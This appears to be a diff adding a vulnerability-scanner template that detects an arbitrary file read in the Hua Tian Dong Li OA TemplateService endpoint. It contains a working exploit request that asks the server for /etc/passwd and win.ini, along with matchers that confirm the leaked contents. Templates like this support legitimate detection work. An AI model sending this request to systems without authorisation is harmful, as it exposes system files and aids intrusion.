@@ -1,0 +1,41 @@
+id: hua-tian-dong-li-oa-templateservice-anyfile-read
+info:
+  name: Hua Tian Dong Li OA TemplateService Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+variables:
+  file: |
+    c:/windows/win.ini
+    /etc/passwd
+
+http:
+  - raw:
+      - |
+        POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <buffalo-call>
+        <method>getHtmlContent</method>
+        <string>{{file}}</string>
+        </buffalo-call>
+    payloads:
+      file:
+        - c:/windows/win.ini
+        - /etc/passwd
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "; for 16-bit app support"
+          - "[files]"
+        condition: and
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+        condition: and
